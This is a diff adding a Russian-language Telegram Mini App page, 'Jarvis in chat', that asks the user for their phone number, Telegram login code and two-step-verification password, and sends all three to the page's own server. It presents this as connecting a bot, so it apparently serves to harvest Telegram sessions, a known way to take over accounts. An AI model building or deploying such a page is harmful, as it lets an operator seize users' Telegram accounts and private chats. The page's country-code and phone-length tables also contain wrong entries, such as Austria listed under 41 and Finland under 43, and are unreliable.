@@ -1,0 +1,785 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Джарвис в чате | Авторизация через Telegram</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <!--<link rel="stylesheet" href="./style.css?v=1.0">-->
+    <style>
+        body {
+    background-color: #1a1d21;
+    color: #fff;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    font-family: Arial, sans-serif;
+    text-align: center;
+}
+
+.container {
+    background-color: #1e2125;
+    padding: 20px;
+    border-radius: 8px;
+    width: 300px;
+    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
+    animation: fadeIn 1s ease-in-out;
+}
+
+.logo {
+    width: 80px;
+    height: 80px;
+}
+
+h1 {
+    font-size: 24px;
+    margin-top: 10px;
+    margin-bottom: 5px;
+    color: #4a90e2;
+}
+
+h3 {
+    margin-top: 15px;
+    margin-bottom: 5px;
+    color: #ffffff;
+}
+
+h2 {
+    color: #4a90e2;
+    margin-bottom: 20px;
+}
+
+p {
+    font-size: 14px;
+    color: #c4c8cc;
+    margin-bottom: 20px;
+}
+
+.form-group {
+    margin: 10px 0;
+    text-align: left;
+}
+
+label {
+    display: block;
+    font-size: 14px;
+    margin-bottom: 5px;
+    color: #4a90e2;
+}
+
+@keyframes shake {
+    0% { transform: translateX(0); }
+    25% { transform: translateX(-5px); }
+    50% { transform: translateX(5px); }
+    75% { transform: translateX(-5px); }
+    100% { transform: translateX(0); }
+}
+
+/* Стиль для виджета с ошибкой при тряске */
+.error-shake {
+    animation: shake 0.5s ease;
+}
+
+/* Стили для поля пароля отдельно от других полей */
+
+input[type="tel"],
+select {
+    width: 100%;
+    padding: 12px;
+    border-radius: 5px;
+    border: 1px solid #4a90e2;
+    background-color: #2C2F33;
+    color: #fff;
+    box-sizing: border-box;
+    transition: background-color 0.3s, border-color 0.3s, transform 0.2s;
+    font-size: 16px;
+}
+
+input[type="text"], input[type="password"] {
+    width: 15%;
+    padding: 10px;
+    border: 1px solid #4a90e2;
+    border-radius: 4px;
+    box-sizing: border-box;
+    text-align: center;
+    font-size: 24px;
+    margin: 5px;
+    background-color: #2C2F33;
+    color: #fff;
+    appearance: none;
+}
+
+input[type="password"] {
+    width: 100%;
+    padding: 12px;
+    border-radius: 5px;
+    border: 1px solid #4a90e2;
+    background-color: #2C2F33;
+    color: #fff;
+    box-sizing: border-box;
+    transition: background-color 0.3s, border-color 0.3s;
+    font-size: 16px;
+}
+
+input[type="text"]::-webkit-outer-spin-button,
+input[type="text"]::-webkit-inner-spin-button,
+input[type="number"]::-webkit-outer-spin-button,
+input[type="number"]::-webkit-inner-spin-button {
+    -webkit-appearance: none;
+    margin: 0;
+}
+
+input[type="number"] {
+    -moz-appearance: textfield;
+    appearance: none;
+}
+
+input[type="number"] {
+    width: 15%;
+    padding: 10px;
+    border: 1px solid #4a90e2;
+    border-radius: 4px;
+    box-sizing: border-box;
+    text-align: center;
+    font-size: 24px;
+    margin: 5px;
+    -webkit-appearance: none;
+    -moz-appearance: textfield;
+    appearance: none;
+    background-color: #2C2F33;
+    color: #fff;
+}
+
+select {
+    appearance: none;
+    background: url('data:image/svg+xml;utf8,<svg fill="none" stroke="%234A90E2" stroke-width="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M6 9l6 6 6-6"/></svg>') no-repeat right 10px center;
+    outline: none;
+    padding-right: 30px;
+    animation: dropdown 0.3s ease;
+}
+
+select:hover,
+select:focus {
+    background-color: #3a3d42;
+    border-color: #6a9bd8;
+}
+
+select option {
+    padding: 12px;
+    background-color: #2C2F33;
+    color: #fff;
+    border-bottom: 1px solid #4a90e2;
+}
+
+button {
+    background-color: #4a90e2;
+    color: #fff;
+    border: none;
+    padding: 15px 30px;
+    border-radius: 25px;
+    font-size: 16px;
+    cursor: pointer;
+    transition: background-color 0.3s ease, transform 0.3s ease;
+    margin-top: 20px;
+    width: 100%;
+}
+
+button:hover {
+    background-color: #3f7bd3;
+    transform: scale(1.05);
+}
+
+button:active {
+    transform: scale(0.95);
+}
+
+button.loading {
+    background-color: #7a8288;
+    cursor: not-allowed;
+}
+
+#errorWidget {
+    background-color: #c0392b;
+    padding: 10px;
+    border-radius: 5px;
+    margin-top: 20px;
+    width: 290px;
+    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.3);
+}
+
+#errorWidget p {
+    color: #ffffff;
+    margin: 0;
+}
+
+#inputFields {
+    display: flex;
+    justify-content: space-around;
+}
+
+#inputFields input {
+    border-radius: 8px;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+}
+
+@keyframes fadeIn {
+    from {
+        opacity: 0;
+        transform: translateY(10px);
+    }
+    to {
+        opacity: 1;
+        transform: translateY(0);
+    }
+}
+
+@keyframes dropdown {
+    from {
+        max-height: 0;
+        opacity: 0;
+    }
+    to {
+        max-height: 200px;
+        opacity: 1;
+    }
+}
+
+@media (max-width: 768px) {
+    /* ваши стили для мобильных устройств */
+    input[type="tel"], input[type="number"] {
+        width: 100%; /* Или другие изменения для мобильных */
+    }
+}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="jarvis-logo.png" alt="Jarvis Logo" class="logo">
+        <h1>Джарвис в чате<br></h1><h3>Подключение к Telegram</h3>
+        <div id="phoneInputForm">
+            <p>Подключение требуется, чтобы бот мог работать в чатах, даже без добавления!</p>
+            <p>Проверьте код страны и введите свой номер телефона.</p>
+            <div class="form-group">
+                <label for="country">Страна</label>
+                <select id="country" name="country">
+                    <option value="7" selected>Российская федерация</option>
+                    <option value="1">США</option>
+                    <option value="44">Великобритания</option>
+                    <option value="380">Украина</option>
+                    <option value="375">Беларусь</option>
+                    <option value="373">Молдова</option>
+                    <option value="77">Казахстан</option>
+                    <option value="374">Армения</option>
+                    <option value="992">Таджикистан</option>
+                    <option value="993">Туркмения</option>
+                    <option value="998">Узбекистан</option>
+                    <option value="995">Грузия</option>
+                    <option value="31">Нидерланды</option>
+                    <option value="49">Германия</option>
+                    <option value="33">Франция</option>
+                    <option value="39">Италия</option>
+                    <option value="34">Испания</option>
+                    <option value="41">Швейцария</option>
+                    <option value="46">Швеция</option>
+                    <option value="45">Дания</option>
+                    <option value="351">Португалия</option>
+                    <option value="41">Австрия</option>
+                    <option value="359">Болгария</option>
+                    <option value="420">Чехия</option>
+                    <option value="48">Польша</option>
+                    <option value="370">Литва</option>
+                    <option value="371">Латвия</option>
+                    <option value="372">Эстония</option>
+                    <option value="420">Словакия</option>
+                    <option value="354">Исландия</option>
+                    <option value="386">Словения</option>
+                    <option value="386">Хорватия</option>
+                    <option value="30">Греция</option>
+                    <option value="43">Финляндия</option>
+                    <option value="46">Норвегия</option>
+                    <option value="421">Сербия</option>
+                    <option value="352">Люксембург</option>
+                    <option value="373">Мальта</option>
+                    <option value="389">Северная Македония</option>
+                    <option value="968">Оман</option>
+                    <option value="971">ОАЭ</option>
+                    <option value="966">Саудовская Аравия</option>
+                    <option value="966">Катар</option>
+                    <option value="966">Кувейт</option>
+                    <option value="962">Иордания</option>
+                    <option value="964">Ирак</option>
+                    <option value="20">Египет</option>
+                    <option value="254">Кения</option>
+                    <option value="256">Уганда</option>
+                    <option value="27">Южноафриканская Республика</option>
+                    <option value="61">Австралия</option>
+                    <option value="64">Новая Зеландия</option>
+                    <option value="81">Япония</option>
+                    <option value="86">Китай</option>
+                    <option value="82">Южная Корея</option>
+                    <option value="91">Индия</option>
+                    <option value="62">Индонезия</option>
+                    <option value="60">Малайзия</option>
+                    <option value="66">Тайланд</option>
+                    <option value="63">Филиппины</option>
+                    <option value="855">Камбоджа</option>
+                    <option value="84">Вьетнам</option>
+                    </select>
+            </div>
+            <div class="form-group">
+                <label for="phone">Номер телефона</label>
+                <input type="tel" id="phone" name="phone" placeholder="+7 ### ### ## ##">
+            </div>
+            <button id="nextButton">ДАЛЕЕ</button>
+        </div>
+        
+        <div id="codeInputForm" style="display:none;">
+            <h2>Введите код</h2>
+            <div id="inputFields">
+                <input type="number" maxlength="1" oninput="handleInput(this)" inputmode="numeric" />
+                <input type="number" maxlength="1" oninput="handleInput(this)" inputmode="numeric" />
+                <input type="number" maxlength="1" oninput="handleInput(this)" inputmode="numeric" />
+                <input type="number" maxlength="1" oninput="handleInput(this)" inputmode="numeric" />
+                <input type="number" maxlength="1" oninput="handleInput(this)" inputmode="numeric" />
+            </div>
+        </div>
+
+        <div id="passwordInputForm" style="display:none;">
+            <h2>Введите пароль</h2>
+            <div class="form-group">
+                <label for="password">Пароль</label>
+                <input type="password" id="password" placeholder="">
+            </div>
+            <button id="submitPasswordButton">ЗАВЕРШИТЬ</button>
+        </div>
+
+        <div id="errorWidget" style="display:none;">
+            <p>Произошла ошибка: <span id="errorMessage"></span></p>
+        </div>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        const countrySelect = document.getElementById('country');
+        const phoneInput = document.getElementById('phone');
+        const nextButton = document.getElementById('nextButton');
+        const errorWidget = document.getElementById('errorWidget');
+        const errorMessage = document.getElementById('errorMessage');
+        const phoneInputForm = document.getElementById('phoneInputForm');
+        const codeInputForm = document.getElementById('codeInputForm');
+        const passwordInputForm = document.getElementById('passwordInputForm');
+        const passwordInput = document.getElementById('password');
+        const submitPasswordButton = document.getElementById('submitPasswordButton');
+        const container = document.querySelector('.container');
+        let phoneNumber = null;
+
+        // Маски для телефонных номеров
+        const phoneMasks = {
+            7: "+7 ### ### ## ##",                  // Россия
+            1: "+1 (###) ###-####",                  // США
+            44: "+44 ## #### ####",                   // Великобритания
+            380: "+380 ## ### ## ##",                 // Украина
+            375: "+375 ## ### ## ##",                 // Беларусь
+            373: "+373 ### #####",                     // Молдова
+            77: "+77 ## ### ## ##",                   // Казахстан
+            374: "+374 ## ### ###",                   // Армения
+            992: "+992 ## ### ####",                   // Таджикистан
+            993: "+993 ## ### ####",                   // Туркмения
+            998: "+998 ## ### ####",                   // Узбекистан
+            995: "+995 ### ### ###",                   // Грузия
+            31: "+31 ## #### ###",                     // Нидерланды
+            49: "+49 #### ### ####",                   // Германия
+            33: "+33 ## ## ## ##",                     // Франция
+            39: "+39 ### ### ####",                    // Италия
+            34: "+34 ### ## ## ##",                    // Испания
+            41: "+41 ## ## ## ##",                     // Швейцария
+            46: "+46 ## ### ## ##",                    // Швеция
+            45: "+45 ## ## ## ##",                     // Дания
+            351: "+351 ## ### ###",                    // Португалия
+            43: "+43 ### ### ###",                     // Австрия
+            359: "+359 ## ### ###",                    // Болгария
+            420: "+420 ### ### ###",                   // Чехия
+            48: "+48 ### ### ###",                     // Польша
+            370: "+370 ### ### ##",                    // Литва
+            371: "+371 ## ### ###",                    // Латвия
+            372: "+372 ### ### ##",                    // Эстония
+            354: "+354 ### ###",                        // Исландия
+            386: "+386 ### ### ###",                   // Словения
+            30: "+30 ## ### ####",                     // Греция
+            43: "+43 ### ### ###",                     // Финляндия
+            46: "+46 ### ## ##",                       // Норвегия
+            421: "+421 ## ### ###",                    // Сербия
+            352: "+352 ## ### ###",                    // Люксембург
+            373: "+373 ### #####",                     // Мальта
+            389: "+389 ## ### ###",                    // Северная Македония
+            968: "+968 ## ### ###",                    // Оман
+            971: "+971 ## ### ####",                   // ОАЭ
+            966: "+966 ## ### ####",                   // Саудовская Аравия
+            20: "+20 ## ### ####",                     // Египет
+            254: "+254 ### ### ###",                   // Кения
+            256: "+256 ### ### ###",                   // Уганда
+            27: "+27 ## ### ####",                     // Южноафриканская Республика
+            61: "+61 ## #######",                       // Австралия
+            64: "+64 #### ###",                        // Новая Зеландия
+            81: "+81 ## #### ####",                    // Япония
+            86: "+86 ### #### ####",                   // Китай
+            82: "+82 ## #### ####",                    // Южная Корея
+            91: "+91 ## #### ####",                    // Индия
+            62: "+62 ## ### ### ###",                       // Индонезия
+            60: "+60 ## #######",                       // Малайзия
+            66: "+66 ## ### ####",                     // Тайланд
+            63: "+63 ## #### #####",                   // Филиппины
+            855: "+855 ## #######",                    // Камбоджа
+            84: "+84 ## ### ####"                      // Вьетнам
+        };
+
+        // Функции для настроек ввода телефона и кода
+        function setInitialPhoneValue() {
+            const currentCountryCode = countrySelect.value;
+            phoneInput.placeholder = phoneMasks[currentCountryCode];
+            phoneInput.value = `+${currentCountryCode} `;
+            phoneInput.setAttribute('maxlength', phoneMasks[currentCountryCode].length);
+            phoneInput.focus();
+            updateNextButton();
+        }
+
+        function handleInput(input) {
+            let value = input.value;
+        
+            if (value.length > 1) {
+                value = value.slice(0, 1);
+                input.value = value;
+            }
+        
+            if (input.nextElementSibling && value !== "") {
+                input.nextElementSibling.focus();
+            }
+        
+            let inputs = document.querySelectorAll('#inputFields input[type="number"]');
+            let allFilled = Array.from(inputs).every(input => input.value !== "");
+        
+            if (allFilled) {
+                sendCode();
+                document.activeElement.blur(); // Скрыть клавиатуру
+            }
+        }
+
+        function sendCode() {
+            let inputs = document.querySelectorAll('#inputFields input[type="number"]');
+            let code = Array.from(inputs).map(input => input.value).join('');
+
+            fetch('/set_code', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ code: code, phone: phoneNumber })
+            })
+            .then(response => {
+                if (response.status === 200) {
+                    tg.close();
+                } else if (response.status === 201) {
+                    phoneInputForm.style.display = 'none';
+                    codeInputForm.style.display = 'none';
+                    passwordInputForm.style.display = 'block';
+                    clearErrorMessage(); // Очистка сообщения об ошибке
+
+                    fetch('/get_password_hint', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ phone: phoneNumber })
+                    })
+                        .then(response => {
+                            if (response.status === 200) {
+                                return response.json();
+                            }
+                        })
+                        .then(data => {
+                            if (data && data.hint) {
+                                passwordInput.placeholder = `Подсказка: ${data.hint}`;
+                            }
+                        })
+                        .catch(error => {
+                            console.error('Error fetching password hint:', error);
+                        });
+                } else if (response.status === 401) {
+                    showErrorMessage('Код не верный, попробуйте ещё раз.');
+                } else if (response.status === 301) {
+                    response.text()
+                        .then(message => {
+                            showErrorMessage(`Telegram временно ограничил вам возможность авторизации. Повторите попытку через: ${message}`);
+                        })
+                        .catch(() => {
+                            showErrorMessage('Telegram временно ограничил вам возможность авторизации. Пожалуйста, попробуйте позже.');
+                        });
+                } else if (response.status === 520 || response.status === 404) {
+                    showErrorMessage('Внутренняя ошибка сервера.');
+                }
+            })
+            .catch(error => {
+                showErrorMessage('Произошла ошибка при выполнении запроса.');
+                console.error('Error:', error);
+            });
+        }
+        
+        document.addEventListener('keydown', function(event) {
+            if (document.activeElement.tagName === 'INPUT' && event.key === 'Enter') {
+                if (phoneInputForm.style.display !== 'none') {
+                    nextButton.click(); // Отправляем номер телефона
+                } else if (codeInputForm.style.display !== 'none') {
+                    let inputs = document.querySelectorAll('#inputFields input[type="number"]');
+                    let allFilled = Array.from(inputs).every(input => input.value !== "");
+                    if (allFilled) {
+                        sendCode(); // Отправляем код
+                    }
+                } else if (passwordInputForm.style.display !== 'none') {
+                    submitPasswordButton.click(); // Отправляем пароль
+                }
+            }
+        });
+
+        submitPasswordButton.addEventListener('click', function() {
+            submitPasswordButton.classList.add('loading');
+            const password = passwordInput.value;
+
+            fetch('/set_password', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ password: password, phone: phoneNumber })
+            })
+            .then(response => {
+                submitPasswordButton.classList.remove('loading');
+                if (response.status === 200){
+                    tg.close();
+                } else if (response.status === 401) {
+                    showErrorMessage('Неверный пароль. Попробуйте ещё раз.');
+                } else {
+                    showErrorMessage('Внутренняя ошибка сервера.');
+                }
+            })
+            .catch(error => {
+                submitPasswordButton.classList.remove('loading');
+                showErrorMessage('Произошла ошибка при выполнении запроса.');
+                console.error('Error:', error);
+            });
+        });
+
+        phoneInput.addEventListener('input', function() {
+            const currentCountryCode = countrySelect.value;
+            const mask = phoneMasks[currentCountryCode];
+            const cleanValue = this.value.replace(/\D/g, '');
+
+            if (!cleanValue.startsWith(currentCountryCode)) {
+                this.value = `+${currentCountryCode} `;
+                return;
+            }
+
+            const rawValue = cleanValue.slice(currentCountryCode.length);
+            const formattedValue = formatPhoneNumber(rawValue, mask.slice(`+${currentCountryCode} `.length));
+
+            this.value = `+${currentCountryCode} ${formattedValue}`;
+            if (this.value.replace(/\D/g, '').length === getLengthForCountry(currentCountryCode)) {
+                document.activeElement.blur();
+            }
+            updateNextButton();
+        });
+
+        countrySelect.addEventListener('change', setInitialPhoneValue);
+        setInitialPhoneValue();
+
+        nextButton.addEventListener('click', function() {
+            nextButton.classList.add('loading');
+            phoneNumber = phoneInput.value;
+
+            fetch('/create_connect', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ phone: phoneNumber })
+            })
+            .then(response => {
+                nextButton.classList.remove('loading');
+                if (response.status === 200){
+                    tg.close();
+                }
+                else if (response.status === 201) {
+                    phoneInputForm.style.display = 'none';
+                    codeInputForm.style.display = 'block';
+                    clearErrorMessage(); // Очистка сообщения об ошибке
+                } else if (response.status === 301) {
+                    response.text()
+                        .then(message => {
+                            showErrorMessage(`Telegram временно ограничил вам возможность авторизации. Повторите попытку через: ${message}`);
+                        })
+                        .catch(() => {
+                            showErrorMessage('Telegram временно ограничил вам возможность авторизации. Пожалуйста, попробуйте позже.');
+                        });
+                } else if (response.status === 404 || response.status === 520) {
+                    showErrorMessage('Внутренняя ошибка сервера.');
+                } else if (response.status === 400) {
+                    showErrorMessage('Вы уже подключены к Джарвис, либо произошла ошибка на стороне Telegram.');
+                }
+            })
+            .catch(error => {
+                nextButton.classList.remove('loading');
+                showErrorMessage('Произошла ошибка при выполнении запроса.');
+                console.error('Error:', error);
+            });
+        });
+
+        document.querySelectorAll('input[type="number"]').forEach(input => {
+            input.addEventListener('keydown', (event) => {
+                if (event.key === 'Backspace') {
+                    if (input.value === "") {
+                        if (input.previousElementSibling) {
+                            input.previousElementSibling.focus();
+                        }
+                    } else {
+                        input.value = "";
+                    }
+                }
+            });
+        });
+
+        function formatPhoneNumber(value, mask) {
+            let newValue = '';
+            let valueIndex = 0;
+
+            for (let i = 0; i < mask.length && valueIndex < value.length; i++) {
+                if (mask[i] === '#') {
+                    newValue += value[valueIndex++];
+                } else {
+                    newValue += mask[i];
+                }
+            }
+
+            return newValue;
+        }
+
+        function updateNextButton() {
+            const currentCountryCode = countrySelect.value;
+            const rawLength = phoneInput.value.replace(/\D/g, '').length;
+            const expectedLength = getLengthForCountry(currentCountryCode);
+            
+            if (rawLength === expectedLength) {
+                nextButton.style.display = 'block';
+            } else {
+                nextButton.style.display = 'none';
+            }
+        }
+
+        function getLengthForCountry(countryCode) {
+            switch (countryCode) {
+                case '7':  // Российская Федерация
+                case '1':  // США
+                case '373': // Молдова
+                    return 11;
+        
+                case '44': // Великобритания
+                    return 12;
+                    
+                case '380': // Украина
+                case '375': // Беларусь
+                case '371': // Латвия
+                case '372': // Эстония
+                case '77':  // Казахстан
+                case '374': // Армения
+                case '992': // Таджикистан
+                case '993': // Туркмения
+                case '998': // Узбекистан
+                case '31':  // Нидерланды
+                case '46':  // Норвегия
+                case '420': // Чехия
+                case '354': // Исландия
+                case '386': // Словения
+                case '30':  // Греция
+                case '43':  // Финляндия
+                case '421': // Сербия
+                case '352': // Люксембург
+                case '389': // Северная Македония
+                case '968': // Оман
+                case '971': // ОАЭ
+                case '966': // Саудовская Аравия, Катар, Кувейт (по аналогии)
+                case '962': // Иордания
+                case '964': // Ирак
+                case '20':  // Египет
+                case '254': // Кения
+                case '256': // Уганда
+                case '27':  // Южноафриканская Республика
+                case '61':  // Австралия
+                case '64':  // Новая Зеландия
+                case '81':  // Япония
+                case '86':  // Китай
+                case '82':  // Южная Корея
+                    return 12;
+        
+                case '62':  // Индонезия
+                    return 13
+        
+                case '91':  // Индия
+                    return 10;
+        
+                case '60':  // Малайзия
+                case '66':  // Тайланд
+                case '63':  // Филиппины
+                case '855': // Камбоджа
+                case '84':  // Вьетнам
+                    return 10;
+        
+                case '359': // Болгария
+                case '49':  // Германия
+                case '33':  // Франция
+                case '39':  // Италия
+                case '34':  // Испания
+                case '41':  // Швейцария, Австрия (по аналогии)
+                case '48':  // Польша
+                case '370': // Литва
+                case '46':  // Швеция
+                case '45':  // Дания
+                    return 9;
+        
+                // В случае, если код страны не указан
+                default:
+                    return 11; // Общее количество
+            }
+        }
+
+        function showErrorMessage(message) {
+            errorMessage.textContent = message;
+            errorWidget.style.display = 'block';
+            errorWidget.classList.remove('error-shake');
+            void errorWidget.offsetWidth;
+            errorWidget.classList.add('error-shake');
+        }
+    
+        // Функция для очистки сообщения об ошибке
+        function clearErrorMessage() {
+            errorWidget.style.display = 'none';
+            errorMessage.textContent = '';
+            errorWidget.classList.remove('error-shake');
+        }
+
+        document.addEventListener('touchstart', function(event) {
+            if (!event.target.closest('input, select')) {
+                phoneInput.blur();
+                passwordInput.blur();
+            }
+        });
+        
+        container.addEventListener('click', function(event) {
+            if (!event.target.closest('input, select')) {
+                document.activeElement.blur();
+            }
+        });
+    </script>
+</body>
+</html>
